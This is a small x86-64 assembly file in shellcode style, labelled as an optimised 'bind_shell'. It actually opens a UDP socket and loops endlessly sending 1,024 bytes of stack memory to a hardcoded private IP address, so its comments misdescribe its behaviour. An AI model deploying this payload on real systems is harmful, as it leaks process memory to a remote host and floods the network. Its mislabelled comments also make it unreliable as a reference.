; An optimised verison on the bind_shell code
; Build with: nasm -felf64 bind_shell_lean.nasm -o tmp.o && ld tmp.o -o bind_shell_lean

global _start
section .text

_start:
	mov rbp, rsp

; Build sleep time
  xor rax, rax
	add eax, 1
	push rax
	xor rax, rax
	push rax

; Build a server sockaddr_in struct on the stack
	xor rax, rax
	push rax
	add ax, 0x010c
	shl rax, 16
	add ax, 0xa8c0
	shl rax, 16
	add ax, 0x2710
	shl rax, 16
	add ax, 2
	push rax

; Create Socket	
	xor rax, rax
	mov rdx, rax
	inc rax
	inc rax
	mov rsi, rax	  	; SOCK_DGRAM (2)
	mov rdi, rax	  	; AF_INET (2)
	add rax, 39	  	; syscall 41
	syscall
	push rax		; Store socket id

_loop:					; send string to a socket, RSI and RDX populated before call    
	mov rdi, [rbp-40]  	; socket id
	lea rsi, [rbp-40]
	shr rsi, 12
	shl rsi, 12
	xor rdx, rdx
	add rdx, 1024
	xor rax, rax    
	mov r10, rax        ; Zero unused params
	xor r9, r9
	add r9, 16
	lea r8, [rbp-32]  	; sockaddr_in struct
	add rax, 44         ; sys_sendto  %rdi=socket, %rsi=buf, %rdx=len, %r10=0, %r8=addr, %r9=addr_len
	syscall

;	mov rax, 35           ;  sys_nanosleep
;	lea rdi, [rbp-16]						;  sleep time
;	lea rsi, [rbp-16]            ;  NULL or some timespc space
;	syscall

	jmp _loop	; loop send


